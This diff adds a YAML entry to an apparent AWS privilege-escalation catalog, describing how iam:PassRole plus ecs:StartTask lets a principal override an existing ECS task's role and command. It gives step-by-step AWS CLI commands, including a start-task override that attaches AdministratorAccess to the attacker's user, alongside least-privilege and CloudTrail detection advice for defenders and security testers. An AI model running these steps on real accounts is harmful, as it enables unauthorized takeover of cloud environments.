@@ -1,0 +1,237 @@
+id: ecs-009
+name: iam:PassRole + ecs:StartTask
+category: new-passrole
+services:
+  - iam
+  - ecs
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must cover both the task role ARN (for the taskRoleArn override) and the execution role ARN defined in the existing task definition — ECS requires PassRole on the execution role even when it is not being changed
+    - permission: ecs:StartTask
+      resourceConstraints: Must have permission to start tasks on an existing EC2 container instance in the target cluster; an existing task definition must be available to override
+  additional:
+    - permission: ecs:ListClusters
+      resourceConstraints: Helpful for discovering available ECS clusters
+    - permission: ecs:ListContainerInstances
+      resourceConstraints: Required to retrieve the container instance ARN needed for the StartTask command
+    - permission: ecs:ListTaskDefinitions
+      resourceConstraints: Helpful for discovering existing task definitions to exploit with overrides
+    - permission: ecs:DescribeTasks
+      resourceConstraints: Helpful for monitoring task execution status
+    - permission: ec2:DescribeSubnets
+      resourceConstraints: Helpful for finding subnets if network configuration is needed
+    - permission: ec2:DescribeSecurityGroups
+      resourceConstraints: Helpful for finding security groups if network configuration is needed
+
+description: A principal with `iam:PassRole` and `ecs:StartTask` can override an existing ECS task definition's container command and task role at runtime using the `--overrides` parameter, then start the task on an existing EC2 container instance — without needing `ecs:RegisterTaskDefinition` or `ecs:RegisterContainerInstance`. By overriding the `taskRoleArn` with a privileged role (passed via `iam:PassRole`) and the container command with a malicious payload, the attacker causes the task to execute arbitrary code with the passed role's permissions. This is the EC2 launch type equivalent of ECS-008, and a lower-permission variant of ECS-005 that removes the requirement for `ecs:RegisterTaskDefinition`.
+
+prerequisites:
+  admin:
+    - An ECS cluster must exist with at least one registered EC2 container instance
+    - An existing task definition must be available in the cluster (no ecs:RegisterTaskDefinition required)
+    - A role must exist that trusts ecs-tasks.amazonaws.com with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+    - An ECS cluster must exist with at least one registered EC2 container instance
+    - An existing task definition must be available in the cluster
+    - A role must exist that trusts ecs-tasks.amazonaws.com
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: aws sts get-caller-identity
+      description: Get your account ID and verify identity before proceeding
+    - step: 2
+      command: |
+        aws ecs list-clusters \
+          --query 'clusterArns' \
+          --output json
+      description: Discover available ECS clusters in the account
+    - step: 3
+      command: |
+        aws ecs list-container-instances \
+          --cluster CLUSTER_NAME \
+          --query 'containerInstanceArns[0]' \
+          --output text
+      description: Retrieve the container instance ARN from the target cluster — this is required for the StartTask command (unlike RunTask, StartTask requires specifying an EC2 container instance)
+    - step: 4
+      command: |
+        aws ecs list-task-definitions \
+          --query 'taskDefinitionArns' \
+          --output json
+      description: Discover existing task definitions to hijack with the --overrides parameter — no new task definition registration required
+    - step: 5
+      command: |
+        aws ecs start-task \
+          --cluster CLUSTER_NAME \
+          --task-definition EXISTING_TASK_DEFINITION \
+          --container-instances CONTAINER_INSTANCE_ARN \
+          --overrides '{
+            "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
+            "containerOverrides": [{
+              "name": "CONTAINER_NAME",
+              "command": ["iam", "attach-user-policy", "--user-name", "STARTING_USER", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
+            }]
+          }'
+      description: Start the existing task definition on the target EC2 container instance, overriding the task role ARN via iam:PassRole and the container command with a payload that escalates the starting principal's privileges
+    - step: 6
+      command: aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN
+      description: Monitor task status until it reaches STOPPED state, then verify privilege escalation was successful
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative task roles** - Very rarely does an ECS task need administrative access. Use the principle of least privilege.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
+  Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificECSRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "ecs-tasks.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+
+  - Monitor CloudTrail for `ecs:StartTask` calls with a `taskRoleArn` in the `overrides` field — this is the specific API pattern that enables this attack
+  - Monitor CloudTrail for ECS task execution by principals who do not usually start tasks
+  - Monitor CloudTrail for roles being passed to ECS that haven't been used before
+  - Monitor and alert on ECS task execution with privileged roles
+  - Regularly audit ECS task definitions for overly permissive defaults — if existing task definitions can be started with any role via overrides, that is the attack surface
+  - Regularly audit all IAM roles that trust the ECS service and down-scope any roles with administrative access
+
+limitations: |
+  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.
+
+  This path requires an existing EC2 container instance registered to the ECS cluster. Unlike ECS-008 (Fargate via ecs:RunTask), this path uses the EC2 launch type and requires specifying a container instance ARN. It cannot be used to start Fargate tasks. If no container instance exists in the cluster, ECS-007 demonstrates how `ecs:RegisterContainerInstance` can be used to register one.
+
+discoveryAttribution:
+  firstDocumented:
+    source: pathfinding.cloud
+    date: 2025
+  derivativeOf:
+    pathId: ecs-005
+    modification: "Removes the requirement for ecs:RegisterTaskDefinition by using the --overrides parameter to override the task role ARN and container command of an existing task definition at runtime"
+  ultimateOrigin:
+    pathId: ecs-004
+    author: Nick Spagnola
+    organization: Rhino Security Labs
+    date: 2020
+    link: https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/
+
+references:
+  - title: "Weaponizing AWS ECS Task Definitions to Steal Credentials From Running Containers"
+    url: "https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/"
+
+relatedPaths:
+  - ecs-005
+  - ecs-007
+  - ecs-008
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/iam-passrole+ecs-starttask"
+    description: "Deploy Terraform into your own AWS account to practice this attack path"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: |
+        The principal with `iam:PassRole` and `ecs:StartTask` permissions. Can be an IAM user or role. This path requires an existing ECS cluster with at least one registered EC2 container instance and an existing task definition to override — no `ecs:RegisterTaskDefinition` or `ecs:RegisterContainerInstance` required.
+
+    - id: ecs_task
+      label: New Running ECS Task
+      type: resource
+      description: |
+        An ECS task started on an existing EC2 container instance via `ecs:StartTask`. The `--overrides` parameter is used at runtime to replace both the task's `taskRoleArn` (passing the privileged role via `iam:PassRole`) and the container command (injecting a malicious payload) — all without registering a new task definition.
+
+        The container instance ARN must be retrieved in advance (e.g., via `ecs:ListContainerInstances`), as `ecs:StartTask` requires specifying an exact EC2 container instance rather than letting ECS schedule placement.
+
+    - id: target_role
+      label: Existing Role That Trusts the ecs-tasks Service
+      type: principal
+      description: |
+        The IAM role passed to the task via the `taskRoleArn` override. Must trust `ecs-tasks.amazonaws.com`. The task automatically assumes this role at runtime, making its credentials available to the container process for executing AWS API calls.
+
+    - id: admin_outcome
+      label: Effective Administrator
+      type: outcome
+      description: |
+        If the target role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access to the AWS account. The overridden container command executes with those permissions — for example, attaching `AdministratorAccess` directly to the starting principal.
+
+    - id: partial_outcome
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: |
+        If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. The overridden container command can still leverage those permissions for data access, lateral movement, or further escalation attempts.
+
+    - id: minimal_outcome
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: |
+        If the target role only has minimal permissions (e.g., `logs:PutLogEvents`), the overridden container command yields little to no meaningful privilege escalation.
+
+  edges:
+    - from: start
+      to: ecs_task
+      label: iam:PassRole + ecs:StartTask
+      description: |
+        Start an existing ECS task definition on a specific EC2 container instance, using `--overrides` to replace the `taskRoleArn` with a privileged role (via `iam:PassRole`) and the container command with a malicious payload. No new task definition registration is required.
+
+        Command:
+        ```bash
+        aws ecs start-task \
+          --cluster CLUSTER_NAME \
+          --task-definition EXISTING_TASK_DEFINITION \
+          --container-instances CONTAINER_INSTANCE_ARN \
+          --overrides '{
+            "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
+            "containerOverrides": [{
+              "name": "CONTAINER_NAME",
+              "command": ["iam", "attach-user-policy", "--user-name", "STARTING_USER", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
+            }]
+          }'
+        ```
+
+    - from: ecs_task
+      to: target_role
+      label: Task assumes role and executes
+      description: |
+        The ECS task automatically assumes the role specified in the `taskRoleArn` override when it starts on the container instance. The overridden container command then runs with that role's temporary credentials available via the ECS task metadata endpoint.
+
+    - from: target_role
+      to: admin_outcome
+      label: If role has admin permissions
+      branch: A
+      condition: admin
+      description: |
+        If the target role has AdministratorAccess or equivalent IAM write permissions, the overridden container command successfully escalates the starting principal to full administrative access.
+
+    - from: target_role
+      to: partial_outcome
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: |
+        If the target role has some elevated permissions but not full admin, the overridden container command can leverage those permissions for data access, security configuration changes, or further privilege escalation paths.
+
+    - from: target_role
+      to: minimal_outcome
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: |
+        If the target role only has minimal permissions, the overridden container command cannot effectively escalate privileges or perform impactful actions.
